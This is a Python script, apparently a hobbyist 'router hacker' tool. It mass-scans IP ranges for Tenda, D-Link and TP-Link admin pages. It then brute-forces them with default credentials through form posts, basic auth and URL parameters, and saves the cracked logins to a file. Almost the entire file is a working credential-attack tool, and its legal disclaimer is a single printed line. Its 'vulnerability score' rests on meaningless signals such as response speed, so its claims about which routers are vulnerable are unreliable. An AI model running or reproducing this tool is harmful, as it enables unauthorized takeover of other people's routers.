#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🌐 ROUTER HACKER - VULNERABILITY CHECKER 🌐           ║
║     ⚡ Check Vulnerability First, Then Crack              ║
║     💀 Tests: admin, admin1, admin2, admin123             ║
║     👑 Owner: Jumman                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import ipaddress
import subprocess
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import json

# ============ PASSWORD PROTECTION ============
REQUIRED_PASSWORD = "ch71"

def check_password():
    print("\n" + "=" * 50)
    print("🔐 JUMMAN ROUTER HACKER - PASSWORD PROTECTED")
    print("=" * 50)
    print("\n⚠️  This tool is password protected!")
    print("👑 Owner: Jumman")
    print("📱 Version: 3.4 - Vulnerability Checker\n")
    
    attempts = 3
    for attempt in range(attempts):
        password = input(f"🔑 Enter password ({attempts - attempt} attempts left): ").strip()
        
        if password == REQUIRED_PASSWORD:
            print("\n✅ Access Granted! Loading tool...\n")
            time.sleep(1)
            return True
        else:
            print(f"❌ Wrong password! {attempts - attempt - 1} attempts remaining\n")
    
    print("\n🚫 Access Denied! Too many failed attempts.")
    sys.exit(1)

# ============ CREDENTIALS ============
TEST_CREDENTIALS = [
    ('admin', 'admin'),
    ('admin', 'admin1'),
    ('admin', 'admin2'),
    ('admin', 'admin123')
]

ROUTER_PORTS = [80, 8080, 443, 8081, 81, 82, 8000, 8443]

LOGIN_PATHS = [
    '/', '/login', '/login.html', '/admin', '/cgi-bin/login',
    '/admin/login', '/system/login', '/goform/login',
    '/login.cgi', '/index.html', '/cgi-bin/luci'
]

ROUTER_BRANDS = {
    'tenda': ['tenda', 'td-'],
    'dlink': ['d-link', 'dlink', 'dir-'],
    'tplink': ['tp-link', 'tplink', 'archer', 'deco']
}

# ============ VULNERABILITY PATTERNS ============
VULNERABILITY_PATTERNS = {
    'default_login_page': [
        'login', 'admin', 'password', 'username', 'sign in'
    ],
    'default_title': [
        'router', 'admin', 'login', 'configuration', 'management'
    ],
    'default_form_fields': [
        'username', 'password', 'user', 'pass', 'pwd', 'login'
    ],
    'default_headers': [
        'server: tenda', 'server: d-link', 'server: tp-link',
        'x-powered-by: tenda', 'x-powered-by: d-link'
    ]
}

# ============ SCANNER CLASS ============
class RouterVulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.vulnerable_routers = []
        self.cracked = []
        self.scan_count = 0
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🌐 ROUTER HACKER - VULNERABILITY CHECKER 🌐           ║
║     🔍 Check Vulnerability First, Then Crack              ║
║     ⚡ Skip Secure Routers - Only Hack Vulnerable Ones    ║
║     💀 Tests: admin, admin1, admin2, admin123             ║
║     👑 Owner: Jumman                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.4 - Vulnerability Checker")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def get_brand(self, content):
        content_lower = content.lower()
        for brand, keywords in ROUTER_BRANDS.items():
            for keyword in keywords:
                if keyword in content_lower:
                    return brand
        return 'unknown'
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    # ============ FAST ROUTER SCANNER ============
    def check_router_ultra_fast(self, ip, port):
        try:
            protocol = 'https' if port == 443 else 'http'
            url = f"{protocol}://{ip}:{port}"
            
            response = self.session.get(url, timeout=0.5, allow_redirects=True)
            
            if response.status_code in [200, 401, 403]:
                content = response.text.lower()
                title = self.extract_title(response.text)
                
                router_keywords = ['router', 'admin', 'login', 'gateway', 
                                 'tenda', 'd-link', 'tp-link', 'dlink', 'tplink',
                                 'configuration', 'management', 'wireless']
                
                if any(kw in content for kw in router_keywords):
                    brand = self.get_brand(content)
                    
                    if brand in ['tenda', 'dlink', 'tplink']:
                        return {
                            'ip': ip,
                            'port': port,
                            'brand': brand,
                            'title': title,
                            'url': url,
                            'content': content,
                            'response': response,
                            'headers': response.headers
                        }
        except:
            pass
        return None
    
    def ultra_fast_scan(self, start_ip, end_ip):
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 2000:
                    print("[!] Limited to 2000 IPs")
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            total_ips = len(ip_list)
            
            print(f"\n⚡ Scanning {total_ips} IPs with 1000+ threads...\n")
            
            with ThreadPoolExecutor(max_workers=1000) as executor:
                futures = []
                for ip in ip_list:
                    for port in ROUTER_PORTS:
                        futures.append(executor.submit(self.check_router_ultra_fast, ip, port))
                
                completed = 0
                total_tasks = len(futures)
                
                for future in as_completed(futures):
                    completed += 1
                    
                    if completed % 200 == 0:
                        pct = (completed / total_tasks) * 100
                        print(f"\r[*] Progress: {pct:.1f}% ({completed}/{total_tasks})", end='')
                        sys.stdout.flush()
                    
                    try:
                        result = future.result()
                        if result:
                            results.append(result)
                            brand_display = result['brand'].upper()
                            print(f"\r\n[🌐] Router Found: {result['ip']}:{result['port']} [{brand_display}]")
                            sys.stdout.flush()
                    except:
                        pass
            
            print()
            return results
        except Exception as e:
            return {'error': str(e)}
    
    # ============ VULNERABILITY CHECKER ============
    def check_vulnerability(self, router):
        """Check if router is vulnerable to default credentials"""
        ip = router['ip']
        port = router['port']
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{ip}:{port}"
        
        vulnerability_score = 0
        vulnerability_reasons = []
        
        print(f"\n[🔍] Checking vulnerability: {ip}:{port} [{router['brand'].upper()}]")
        
        try:
            # Get the login page
            response = self.session.get(base_url, timeout=2, allow_redirects=True)
            content = response.text.lower()
            headers = str(response.headers).lower()
            
            # === CHECK 1: Default login page ===
            login_indicators = ['login', 'admin', 'password', 'username', 'sign in']
            login_count = sum(1 for l in login_indicators if l in content)
            if login_count >= 2:
                vulnerability_score += 20
                vulnerability_reasons.append("Default login page detected")
                print(f"   ✅ Default login page detected")
            else:
                print(f"   ❌ No default login page")
            
            # === CHECK 2: Default title ===
            title_keywords = ['router', 'admin', 'login', 'configuration']
            title_match = any(k in content for k in title_keywords)
            if title_match:
                vulnerability_score += 15
                vulnerability_reasons.append("Default router title detected")
                print(f"   ✅ Default router title detected")
            
            # === CHECK 3: Default form fields ===
            form_fields = ['username', 'password', 'user', 'pass', 'pwd']
            field_match = any(f in content for f in form_fields)
            if field_match:
                vulnerability_score += 20
                vulnerability_reasons.append("Default form fields detected")
                print(f"   ✅ Default form fields detected")
            
            # === CHECK 4: Default headers ===
            header_patterns = ['tenda', 'd-link', 'tp-link', 'dlink', 'tplink']
            header_match = any(h in headers for h in header_patterns)
            if header_match:
                vulnerability_score += 15
                vulnerability_reasons.append("Default server headers detected")
                print(f"   ✅ Default server headers detected")
            
            # === CHECK 5: No security headers ===
            security_headers = ['x-frame-options', 'content-security-policy', 'x-xss-protection']
            has_security = any(h in headers for h in security_headers)
            if not has_security:
                vulnerability_score += 15
                vulnerability_reasons.append("No security headers detected")
                print(f"   ✅ No security headers (vulnerable)")
            else:
                print(f"   ❌ Security headers present")
            
            # === CHECK 6: Response time ===
            if response.elapsed.total_seconds() < 0.5:
                vulnerability_score += 10
                vulnerability_reasons.append("Fast response time")
                print(f"   ✅ Fast response time")
            
            # === CHECK 7: Default error pages ===
            error_patterns = ['404', 'not found', 'error', 'invalid']
            has_error = any(e in content for e in error_patterns)
            if has_error:
                vulnerability_score += 5
                vulnerability_reasons.append("Default error pages")
                print(f"   ✅ Default error pages")
            
            # === DETERMINE VULNERABILITY ===
            is_vulnerable = vulnerability_score >= 40
            
            print(f"\n   📊 Vulnerability Score: {vulnerability_score}/100")
            print(f"   🔐 Status: {'VULNERABLE ✅' if is_vulnerable else 'SECURE ❌'}")
            
            if vulnerability_reasons:
                print(f"   📋 Reasons: {', '.join(vulnerability_reasons[:3])}")
            
            router['vulnerability_score'] = vulnerability_score
            router['vulnerability_reasons'] = vulnerability_reasons
            router['is_vulnerable'] = is_vulnerable
            
            return is_vulnerable
            
        except Exception as e:
            print(f"   ❌ Error checking vulnerability: {e}")
            return False
    
    # ============ CREDENTIAL TESTER ============
    def try_all_passwords(self, router):
        """Try all 4 passwords on vulnerable router"""
        if not router.get('is_vulnerable', False):
            print(f"\n[⏭️] Skipping {router['ip']} - Not vulnerable")
            return None
        
        ip = router['ip']
        port = router['port']
        protocol = 'https' if port == 443 else 'http'
        base_url = f"{protocol}://{ip}:{port}"
        
        print(f"\n[💀] Attempting to crack: {ip}:{port} [{router['brand'].upper()}]")
        print(f"   Vulnerability Score: {router.get('vulnerability_score', 0)}/100")
        
        # Get the login page to analyze
        try:
            login_page = self.session.get(base_url, timeout=1, allow_redirects=True)
            content = login_page.text
        except:
            content = ""
        
        login_action, form_fields = self.detect_login_form(content, base_url)
        
        for username, password in TEST_CREDENTIALS:
            print(f"    Trying: {username}:{password}", end=' ')
            
            # === METHOD 1: Direct POST ===
            if login_action:
                try:
                    data = {}
                    for field in form_fields:
                        if 'user' in field.lower() or 'name' in field.lower():
                            data[field] = username
                        elif 'pass' in field.lower() or 'pwd' in field.lower():
                            data[field] = password
                        elif 'login' in field.lower():
                            data[field] = 'Login'
                        elif 'submit' in field.lower():
                            data[field] = 'Submit'
                    
                    if data:
                        response = requests.post(login_action, data=data, timeout=1, 
                                                allow_redirects=True, verify=False)
                        if self.is_logged_in(response, username, password):
                            print("✅ SUCCESS!")
                            return {
                                'username': username,
                                'password': password,
                                'url': login_action,
                                'method': 'form_post'
                            }
                except:
                    pass
            
            # === METHOD 2: Form variations ===
            form_variations = [
                {'username': username, 'password': password},
                {'user': username, 'pass': password},
                {'usr': username, 'pwd': password},
                {'uname': username, 'pwd': password},
                {'login': username, 'password': password},
                {'admin_username': username, 'admin_password': password},
                {'auth_user': username, 'auth_pass': password},
                {'u': username, 'p': password},
                {'name': username, 'pwd': password},
                {'admin': username, 'pass': password},
                {'userid': username, 'passwd': password},
                {'log': username, 'pwd': password},
                {'username': username, 'passwd': password},
                {'un': username, 'pw': password},
            ]
            
            for path in LOGIN_PATHS:
                url = base_url + path
                
                for data in form_variations:
                    try:
                        response = requests.post(url, data=data, timeout=0.5, 
                                                allow_redirects=True, verify=False)
                        if self.is_logged_in(response, username, password):
                            print("✅ SUCCESS!")
                            return {
                                'username': username,
                                'password': password,
                                'url': url,
                                'method': 'form_post'
                            }
                    except:
                        pass
            
            # === METHOD 3: Basic Auth ===
            for path in LOGIN_PATHS[:3]:
                try:
                    url = base_url + path
                    response = requests.get(url, auth=(username, password), 
                                           timeout=0.5, allow_redirects=True, verify=False)
                    if self.is_logged_in(response, username, password):
                        print("✅ SUCCESS!")
                        return {
                            'username': username,
                            'password': password,
                            'url': url,
                            'method': 'basic_auth'
                        }
                except:
                    pass
            
            # === METHOD 4: URL Parameters ===
            param_variations = [
                f"?username={username}&password={password}",
                f"?user={username}&pass={password}",
                f"?login={username}&password={password}",
                f"?u={username}&p={password}",
                f"?name={username}&pwd={password}",
            ]
            
            for path in LOGIN_PATHS[:3]:
                for param in param_variations:
                    try:
                        url = base_url + path + param
                        response = requests.get(url, timeout=0.5, 
                                               allow_redirects=True, verify=False)
                        if self.is_logged_in(response, username, password):
                            print("✅ SUCCESS!")
                            return {
                                'username': username,
                                'password': password,
                                'url': url,
                                'method': 'url_params'
                            }
                    except:
                        pass
            
            print("❌ Failed")
        
        print(f"❌ No credentials found for {ip}")
        return None
    
    def detect_login_form(self, html_content, base_url):
        action = None
        fields = []
        
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
        action_match = re.search(form_pattern, html_content, re.IGNORECASE)
        
        if action_match:
            action = action_match.group(1)
            if not action.startswith('http'):
                if action.startswith('/'):
                    action = base_url + action
                else:
                    action = base_url + '/' + action
        
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        inputs = re.findall(input_pattern, html_content, re.IGNORECASE)
        
        for inp in inputs:
            if inp.lower() not in ['submit', 'button', 'reset']:
                fields.append(inp)
        
        if not action:
            action = base_url + '/login'
            fields = ['username', 'password']
        
        return action, fields
    
    def is_logged_in(self, response, username, password):
        if response.status_code == 200:
            content = response.text.lower()
            
            failure_patterns = [
                'invalid', 'incorrect', 'failed', 'error', 'denied',
                'unauthorized', 'wrong', 'retry', 'try again',
                'login failed', 'authentication failed', 'access denied',
                'invalid username', 'invalid password', 'incorrect password'
            ]
            
            for pattern in failure_patterns:
                if pattern in content:
                    return False
            
            success_patterns = [
                'welcome', 'dashboard', 'status', 'configuration',
                'logout', 'settings', 'admin', 'main', 'index',
                'home', 'panel', 'console', 'management', 'network',
                'overview', 'system', 'wireless', 'firewall', 'wan', 'lan',
                'connected', 'success', 'redirecting'
            ]
            
            for pattern in success_patterns:
                if pattern in content:
                    login_indicators = ['login', 'username', 'password', 'sign in']
                    login_count = sum(1 for l in login_indicators if l in content)
                    if login_count < 2:
                        return True
            
            if 'window.location' in content or 'window.location.href' in content:
                return True
            
            if response.cookies:
                for cookie in response.cookies:
                    cookie_name = cookie.name.lower()
                    if 'session' in cookie_name or 'auth' in cookie_name or 'login' in cookie_name:
                        return True
        
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get('Location', '').lower()
            success_redirects = ['admin', 'dashboard', 'main', 'index', 'home', 
                               'welcome', 'status', 'overview', 'system']
            for s in success_redirects:
                if s in location:
                    return True
            if 'login' not in location:
                return True
        
        return False
    
    # ============ PROCESS ROUTERS ============
    def process_routers(self, routers):
        """Check vulnerability and crack only vulnerable ones"""
        if not routers:
            return [], []
        
        vulnerable = []
        not_vulnerable = []
        
        print(f"\n🔍 Checking vulnerability for {len(routers)} routers...")
        print("=" * 60)
        
        # Check vulnerability for each router
        for router in routers:
            is_vulnerable = self.check_vulnerability(router)
            if is_vulnerable:
                vulnerable.append(router)
            else:
                not_vulnerable.append(router)
        
        print("\n" + "=" * 60)
        print(f"📊 Vulnerability Summary:")
        print(f"   ✅ Vulnerable Routers: {len(vulnerable)}")
        print(f"   ❌ Secure Routers: {len(not_vulnerable)}")
        print("=" * 60)
        
        if not vulnerable:
            print("\n❌ No vulnerable routers found. Skipping password cracking.")
            return [], []
        
        print(f"\n💀 Proceeding to crack {len(vulnerable)} vulnerable routers...")
        print("=" * 60)
        
        cracked = []
        with ThreadPoolExecutor(max_workers=30) as executor:
            futures = {executor.submit(self.try_all_passwords, router): router for router in vulnerable}
            
            for future in as_completed(futures):
                router = futures[future]
                try:
                    result = future.result()
                    if result:
                        cracked.append({
                            'ip': router['ip'],
                            'port': router['port'],
                            'brand': router['brand'],
                            'username': result['username'],
                            'password': result['password'],
                            'url': result['url'],
                            'method': result.get('method', 'unknown'),
                            'vulnerability_score': router.get('vulnerability_score', 0)
                        })
                        print(f"\n✅✅✅ CRACKED! {router['ip']} [{router['brand'].upper()}]")
                        print(f"   👤 {result['username']}:{result['password']}")
                        print(f"   🔗 {result['url']}")
                        print(f"   📌 Method: {result.get('method', 'unknown')}")
                except Exception as e:
                    pass
        
        return vulnerable, cracked
    
    def save_results(self, routers, vulnerable, cracked):
        filename = f"router_scan_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("🌐 ROUTER SCAN RESULTS - JUMMAN EDITION\n")
                f.write("=" * 60 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total Routers Found: {len(routers)}\n")
                f.write(f"Vulnerable Routers: {len(vulnerable)}\n")
                f.write(f"Routers Cracked: {len(cracked)}\n")
                f.write("=" * 60 + "\n\n")
                
                if cracked:
                    f.write("💀 CRACKED ROUTERS:\n")
                    f.write("-" * 40 + "\n")
                    for i, c in enumerate(cracked, 1):
                        f.write(f"{i}. {c['ip']}:{c['port']} [{c['brand'].upper()}]\n")
                        f.write(f"   👤 {c['username']}:{c['password']}\n")
                        f.write(f"   🔗 {c['url']}\n")
                        f.write(f"   📌 Method: {c.get('method', 'unknown')}\n")
                        f.write(f"   📊 Vulnerability Score: {c.get('vulnerability_score', 0)}/100\n")
                        f.write("-" * 40 + "\n")
                
                if vulnerable:
                    f.write("\n🔓 VULNERABLE ROUTERS (Not Cracked):\n")
                    f.write("-" * 40 + "\n")
                    for i, r in enumerate(vulnerable, 1):
                        if r not in [c['ip'] for c in cracked]:
                            f.write(f"{i}. {r['ip']}:{r['port']} [{r['brand'].upper()}]\n")
                            f.write(f"   📊 Vulnerability Score: {r.get('vulnerability_score', 0)}/100\n")
                            f.write(f"   📋 Reasons: {', '.join(r.get('vulnerability_reasons', [])[:3])}\n")
                            f.write("-" * 40 + "\n")
                
                if routers:
                    f.write("\n🌐 ALL ROUTERS FOUND:\n")
                    f.write("-" * 40 + "\n")
                    for i, r in enumerate(routers, 1):
                        f.write(f"{i}. {r['ip']}:{r['port']} [{r['brand'].upper()}]\n")
                        f.write(f"   Title: {r['title']}\n")
                        f.write(f"   URL: {r['url']}\n")
                        f.write(f"   Vulnerable: {'✅ Yes' if r.get('is_vulnerable', False) else '❌ No'}\n")
                        f.write("-" * 40 + "\n")
            
            print(f"\n✅ Results saved to: {filename}")
        except Exception as e:
            print(f"\n❌ Error saving: {e}")
    
    def run(self):
        self.clear_screen()
        self.print_banner()
        
        print("\n⚠️  LEGAL DISCLAIMER:")
        print("This tool is for authorized testing only.")
        print("Unauthorized access to routers is illegal.\n")
        
        print("⚡ HOW IT WORKS:")
        print("   1️⃣ Scan for routers (Tenda, D-Link, TP-Link)")
        print("   2️⃣ Check vulnerability of each router")
        print("   3️⃣ Skip secure routers (not vulnerable)")
        print("   4️⃣ Attempt password cracking on vulnerable routers only")
        print("   5️⃣ Tests: admin, admin1, admin2, admin123\n")
        
        print("📌 SCAN OPTIONS:")
        print("1. Quick Scan (Local Network - 50 IPs)")
        print("2. Custom IP Range")
        print("3. Full Network Scan (All Common Ranges)")
        print("4. Exit")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == '1':
            local_ip = self.get_local_ip()
            if not local_ip:
                print("❌ Could not detect local network!")
                return
            
            subnet = ".".join(local_ip.split(".")[:3])
            start_ip = f"{subnet}.1"
            end_ip = f"{subnet}.50"
            
            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
            start_time = time.time()
            
            routers = self.ultra_fast_scan(start_ip, end_ip)
            
            if isinstance(routers, dict) and 'error' in routers:
                print(f"\n❌ Error: {routers['error']}")
                return
            
            elapsed = time.time() - start_time
            
            if routers:
                print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                
                vulnerable, cracked = self.process_routers(routers)
                
                print("\n" + "=" * 60)
                print("📊 FINAL SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(routers)}")
                print(f"Vulnerable Routers: {len(vulnerable)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                        print(f"   🔗 {c['url']}")
                        print(f"   📊 Score: {c.get('vulnerability_score', 0)}/100")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(routers, vulnerable, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '2':
            print("\n🔍 Enter IP Range:")
            start_ip = input("Start IP: ").strip()
            end_ip = input("End IP: ").strip()
            
            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
                print("❌ Invalid IP format!")
                return
            
            start_time = time.time()
            routers = self.ultra_fast_scan(start_ip, end_ip)
            
            if isinstance(routers, dict) and 'error' in routers:
                print(f"\n❌ Error: {routers['error']}")
                return
            
            elapsed = time.time() - start_time
            
            if routers:
                print(f"\n[✓] Found {len(routers)} routers in {elapsed:.2f} seconds")
                
                vulnerable, cracked = self.process_routers(routers)
                
                print("\n" + "=" * 60)
                print("📊 FINAL SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(routers)}")
                print(f"Vulnerable Routers: {len(vulnerable)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                        print(f"   🔗 {c['url']}")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(routers, vulnerable, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '3':
            print("\n🌍 Full Network Scan Started!")
            print("Scanning common ranges with 1000+ threads...\n")
            
            all_routers = []
            ranges = [
                ('192.168.1.1', '192.168.1.254'),
                ('192.168.0.1', '192.168.0.254'),
                ('10.0.0.1', '10.0.0.254'),
                ('172.16.0.1', '172.16.0.254'),
            ]
            
            start_time = time.time()
            
            for start, end in ranges:
                print(f"\n[*] Scanning: {start} - {end}")
                routers = self.ultra_fast_scan(start, end)
                if isinstance(routers, list):
                    all_routers.extend(routers)
            
            elapsed = time.time() - start_time
            
            if all_routers:
                print(f"\n[✓] Found {len(all_routers)} routers in {elapsed:.2f} seconds")
                
                vulnerable, cracked = self.process_routers(all_routers)
                
                print("\n" + "=" * 60)
                print("📊 FINAL SUMMARY")
                print("=" * 60)
                print(f"Routers Found: {len(all_routers)}")
                print(f"Vulnerable Routers: {len(vulnerable)}")
                print(f"Routers Cracked: {len(cracked)}")
                print(f"Time Taken: {elapsed:.2f} seconds")
                
                if cracked:
                    print("\n💀 CRACKED CREDENTIALS:")
                    for c in cracked:
                        print(f"   {c['ip']} [{c['brand'].upper()}] - {c['username']}:{c['password']}")
                        print(f"   🔗 {c['url']}")
                
                save = input("\n💾 Save results? (y/n): ").strip().lower()
                if save == 'y':
                    self.save_results(all_routers, vulnerable, cracked)
            else:
                print("\n❌ No routers found!")
        
        elif choice == '4':
            print("\n👋 Goodbye!")
            sys.exit(0)
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")


# ============ MAIN ============
def main():
    try:
        check_password()
        
        try:
            import requests
        except ImportError:
            print("[*] Installing requests...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        
        scanner = RouterVulnerabilityScanner()
        while True:
            scanner.run()
            
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()